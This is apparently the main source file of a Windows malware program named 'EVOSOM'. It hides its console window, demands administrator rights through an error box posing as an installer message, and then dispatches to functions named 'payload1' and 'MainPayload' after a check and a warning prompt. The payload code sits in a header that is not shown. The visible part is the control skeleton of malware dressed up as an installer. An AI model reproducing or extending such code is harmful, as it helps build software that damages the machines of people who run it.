#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

#include "evosom.h"




int main(int argc, char* argv[]) {

	if (!isAdmin()) {
		MessageBoxW(NULL, L"Please Run This As Admin, Cannot Start Installer", L"É̸̦̺̞̉̏̌̌̚̚̕V̵̧̥͓̼͓̟̈́̾̑̎̀͆͋͗̈́͛̚͝Ơ̶̠͉̩͓̞̣͇̣̊͋͒̎͌̾̾͒S̴̨̛̟͇̠̩̠̝͕̰̬͙̹̦̫̉̂̀̿̉̆͗̿̇͛̅̓̚͠Ọ̶͉͙̹̘̹͉̲̪̬͎̜̉̇̋̓̃̈́̆̊͑̒̓̈́M̸̜̙̄͗̈́̐̆͛̓̕̕͝ ̴̖̞̺͕͖̘͓͖̊̿̏̾̇̿̽̑͠I̶̡̨͕̲̟͖̙͙̮̭̽͒̿̓͆͊̆͐̓͘͘ͅͅN̵̛̺̪̯͉̯͑́̂̀̔̋͝ͅͅŞ̵͉̹͈͇͎͇̦̳̮̭̥̻̯̂͗́̽̀͊̐̂̾̆͌̿̐̚T̷̝̬̮͓̳̗͔̿̆͒̎̾̇̍͆̓͒̆͛̕͠͝Ä̷̻̰̭̦̖̪̺̣̹́̒̀͑̒́͘̚͝L̴̢̛͚̘͛̈̇̒͆̅̓͗̅͜L̷͖̫͉̙̲̝̭̞̍̈́̚͜͝E̶̖͖̪̘̦͇͈̰̬̾̓̔͂͂̓̀͒͘̕͜͠R̶̼̐̀̀", MB_OK | MB_ICONERROR);
		return 0;
	}
	
	if (checker()) {
		goto PASS;
	}

	if (warning()) {
		payload1(argv[0]);
		return 0;
	}
	else return 0;

	return 0;

PASS:
	MainPayload();


	return 0;
}